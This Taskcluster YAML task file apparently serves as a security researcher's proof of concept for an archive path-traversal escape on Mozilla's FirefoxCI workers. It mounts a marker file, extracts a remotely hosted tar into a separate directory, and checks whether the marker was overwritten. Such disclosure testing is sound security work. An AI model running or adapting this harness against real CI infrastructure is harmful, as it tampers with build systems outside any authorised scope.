version: 1
reporting: checks-v1
tasks:
  - schedulerId: taskcluster-github
    provisionerId: mozilla-t
    workerType: t-linux-2204-wayland
    priority: low
    created: {$fromNow: ''}
    deadline: {$fromNow: '1 hour'}
    expires: {$fromNow: '1 day'}
    payload:
      maxRunTime: 300
      mounts:
        - file: outside/escaped.txt
          content:
            raw: TC_ARCHIVE_CHAIN_BASELINE_20260822
        - directory: extraction
          format: tar
          content:
            url: https://raw.githubusercontent.com/bughunter0xff/mozilla-version/978d4f5ddcbe3c6992a95f2ca864d7483e12720f/archive-chain.tar
            sha256: 83d802f524dd84d1f888002e3681d434a6e1805002e65cd444de15200c7e0cb5
      command:
        - - /bin/bash
          - -cx
          - |
            set -eu
            observed="$(cat outside/escaped.txt)"
            {
              echo "worker_pool=mozilla-t/t-linux-2204-wayland"
              echo "declared_archive_destination=extraction"
              echo "outside_marker_path=outside/escaped.txt"
              echo "outside_marker_value=$observed"
              echo "expected_value=TC_ARCHIVE_CHAIN_ESCAPE_20260822"
            } | tee archive-chain-proof.txt
            test "$observed" = "TC_ARCHIVE_CHAIN_ESCAPE_20260822"
      artifacts:
        - name: public/archive-chain-proof.txt
          path: archive-chain-proof.txt
          type: file
          expires: {$fromNow: '1 day'}
    metadata:
      name: FirefoxCI archive containment marker validation
      description: One marker-only Generic Worker archive mount validation on a disposable Level-1 task.
      owner: bughunter0xff@users.noreply.github.com
      source: https://github.com/bughunter0xff/mozilla-version/blob/security/archive-chain-fxci-20260822/.taskcluster.yml
